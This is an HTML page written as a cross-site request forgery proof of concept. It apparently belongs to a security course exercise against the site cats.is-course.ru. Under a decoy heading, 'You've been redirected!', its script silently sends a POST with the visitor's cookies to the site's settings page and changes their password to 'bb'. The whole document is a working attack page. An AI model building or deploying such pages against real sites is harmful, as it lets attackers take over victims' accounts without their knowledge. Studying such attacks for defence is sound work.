<!DOCTYPE html>
<html>
  <body>
    <h1>You've been redirected!</h1>
    <script>
      // Example CSRF attack: changing the victim's password in the background
      const victimUrl = 'https://cats.is-course.ru/settings'; 

      // Use Fetch API to send a POST request to victim's server to change the password
      fetch(victimUrl, {
        "credentials": "include",
        "headers": {
          "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
          "Content-Type": "application/x-www-form-urlencoded",
          "Upgrade-Insecure-Requests": "1",
          "Sec-Fetch-Dest": "document",
          "Sec-Fetch-Mode": "navigate",
          "Sec-Fetch-Site": "cross-site",
          "Sec-Fetch-User": "?1",
          "Priority": "u=0, i"
        },
        "referrer": victimUrl,
        "body": "password=bb&confirm-password=bb",
        "method": "POST",
        "mode": "cors"
      })
      .then(response => {
        if (response.ok) {
          console.log('Password change successful!');
        } else {
          console.log('Failed to change password');
        }
      })
      .catch(error => console.error('Error:', error));
    </script>
  </body>
</html>
